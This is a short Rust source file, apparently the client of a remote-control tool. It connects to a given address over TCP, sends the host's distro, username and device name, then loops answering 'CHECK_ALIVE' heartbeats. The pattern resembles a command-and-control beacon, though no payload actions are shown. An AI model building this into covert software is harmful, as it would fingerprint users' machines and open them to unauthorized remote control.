use std::env;
use std::io::{Read, Write};
use std::str::from_utf8;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt, BufReader},
    net::TcpStream,
};
use util;

pub async fn connect(addr: &str) -> Result<TcpStream, ()> {
    match TcpStream::connect(&addr).await {
        Ok(mut stream) => {
            let device_info = format!(
                "{}\n{}\n{}",
                whoami::distro(),
                whoami::username(),
                whoami::devicename()
            );

            util::send_with_delimiter(&mut stream, device_info.as_bytes()).await;

            Ok(stream)
        }
        Err(_e) => Err(()),
    }
}

pub async fn handle_flags(stream: &mut TcpStream) {
    loop {
        let flag = util::receive_with_delimiter(stream).await;

        match from_utf8(&flag).unwrap().trim() {
            "CHECK_ALIVE" => stream.write_all("ALIVE".as_bytes()).await.unwrap(),
            _e => {}
        }
    }
}
